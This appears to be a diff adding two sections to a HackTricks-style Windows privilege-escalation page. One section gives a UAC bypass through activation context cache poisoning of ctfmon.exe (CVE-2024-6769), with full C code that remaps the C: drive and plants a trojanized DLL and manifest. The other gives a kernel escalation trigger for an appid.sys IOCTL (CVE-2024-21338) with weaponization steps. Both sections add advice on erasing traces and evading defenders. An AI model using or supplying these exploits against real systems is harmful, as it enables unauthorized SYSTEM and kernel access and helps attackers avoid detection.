@@ -68,6 +68,74 @@ int main(void) {
 
 ---
 
+## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
+Drive remapping + activation context cache poisoning still works against patched Windows 10/11 builds because `ctfmon.exe` runs as a high-integrity trusted UI process that happily loads from the caller’s impersonated `C:` drive and reuses whatever DLL redirections `CSRSS` has cached. Abuse goes as follows: re-point `C:` at attacker-controlled storage, drop a trojanized `msctf.dll`, launch `ctfmon.exe` to gain high integrity, then ask `CSRSS` to cache a manifest that redirects a DLL used by an auto-elevated binary (e.g., `fodhelper.exe`) so the next launch inherits your payload without a UAC prompt.
+
+Practical workflow:
+1. Prepare a fake `%SystemRoot%\System32` tree and copy the legitimate binary you plan to hijack (often `ctfmon.exe`).
+2. Use `DefineDosDevice(DDD_RAW_TARGET_PATH)` to remap `C:` inside your process, keeping `DDD_NO_BROADCAST_SYSTEM` so the change stays local.
+3. Drop your DLL + manifest into the fake tree, call `CreateActCtx/ActivateActCtx` to push the manifest into the activation-context cache, then launch the auto-elevated binary so it resolves the redirected DLL straight into your shellcode.
+4. Delete the cache entry (`sxstrace ClearCache`) or reboot when finished to erase attacker fingerprints.
+
+<details>
+<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
+
+```c
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <shlwapi.h>
+#pragma comment(lib, "shlwapi.lib")
+
+BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
+    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return FALSE;
+    DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
+    BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
+    CloseHandle(h);
+    return ok;
+}
+
+int wmain(void) {
+    const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
+    SHCreateDirectoryExW(NULL, stage, NULL);
+    CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
+    CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);
+
+    DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
+                     L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
+
+    const wchar_t manifest[] =
+        L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
+        L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
+        L" <dependency><dependentAssembly>"
+        L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
+        L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
+        L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
+        L" </dependentAssembly></dependency></assembly>";
+    WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);
+
+    ACTCTXW act = { sizeof(act) };
+    act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
+    ULONG_PTR cookie = 0;
+    HANDLE ctx = CreateActCtxW(&act);
+    ActivateActCtx(ctx, &cookie);
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+    WaitForSingleObject(pi.hProcess, 2000);
+    DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
+    return 0;
+}
+```
+
+</details>
+
+Cleanup tip: after popping SYSTEM, call `sxstrace Trace -logfile %TEMP%\sxstrace.etl` followed by `sxstrace Parse` when testing—if you see your manifest name in the log, defenders can too, so rotate paths each run.
+
+---
+
 ## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
 If the current process holds **both** `SeDebug` and `SeImpersonate` privileges (typical for many service accounts), you can steal the token from `winlogon.exe`, duplicate it, and start an elevated process:
 
@@ -203,10 +271,66 @@ Validate the result with Process Explorer/Process Hacker by checking the Protect
 
 ---
 
+## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
+`appid.sys` exposes a device object (`\\.\\AppID`) whose smart-hash maintenance IOCTL accepts user-supplied function pointers whenever the caller runs as `LOCAL SERVICE`; Lazarus is abusing that to disable PPL and load arbitrary drivers, so red teams should have a ready-made trigger for lab use.
+
+Operational notes:
+- You still need a `LOCAL SERVICE` token. Steal it from `Schedule` or `WdiServiceHost` using `SeImpersonatePrivilege`, then impersonate before touching the device so ACL checks pass.
+- IOCTL `0x22A018` expects a struct containing two callback pointers (query length + read function). Point both at user-mode stubs that craft a token overwrite or map ring-0 primitives, but keep the buffers RWX so KernelPatchGuard does not crash mid-chain.
+- After success, drop out of impersonation and revert the device handle; defenders now look for unexpected `Device\\AppID` handles, so close it immediately once privilege is gained.
+
+<details>
+<summary>C - Skeleton trigger for `appid.sys` smart-hash abuse</summary>
+
+```c
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <stdio.h>
+
+typedef struct _APPID_SMART_HASH {
+    ULONGLONG UnknownCtx[4];
+    PVOID QuerySize;   // called first
+    PVOID ReadBuffer;  // called with size returned above
+    BYTE  Reserved[0x40];
+} APPID_SMART_HASH;
+
+DWORD WINAPI KernelThunk(PVOID ctx) {
+    // map SYSTEM shellcode, steal token, etc.
+    return 0;
+}
+
+int wmain(void) {
+    HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDev == INVALID_HANDLE_VALUE) {
+        printf("[-] CreateFileW failed: %lu\n", GetLastError());
+        return 1;
+    }
+
+    APPID_SMART_HASH in = {0};
+    in.QuerySize = KernelThunk;
+    in.ReadBuffer = KernelThunk;
+
+    DWORD bytes = 0;
+    if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
+        printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
+    }
+    CloseHandle(hDev);
+    return 0;
+}
+```
+
+</details>
+
+Minimal fix-up for a weaponized build: map an RWX section with `VirtualAlloc`, copy your token duplication stub there, set `KernelThunk = section`, and once `DeviceIoControl` returns you should be SYSTEM even under PPL.
+
+---
+
 ## References
 * Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
 * SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
 * CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
 * Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
+* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
+* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)
 
 {{#include ../../banners/hacktricks-training.md}}
